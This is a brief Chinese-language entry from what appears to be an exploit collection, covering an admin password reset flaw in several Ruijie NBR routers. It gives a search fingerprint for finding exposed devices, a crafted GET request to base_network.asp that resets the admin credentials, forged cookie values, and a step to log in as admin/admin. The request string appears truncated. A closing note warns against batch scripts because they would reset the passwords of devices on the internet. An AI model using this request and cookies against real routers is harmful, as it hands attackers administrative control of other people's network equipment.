# 锐捷NBR系列多款路由器存在管理员密码重置漏洞

锐捷 ｜ 其他 ｜ —
- **指纹**：`body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"`
- **请求**：`GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admi`

**Payload**
```
1.重置密码
Host:
Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=
1. 使用admin/admin登录系统
**注意事项：**不要写批量测试脚本！！会导致互联网上可访问设备密码都被修改
```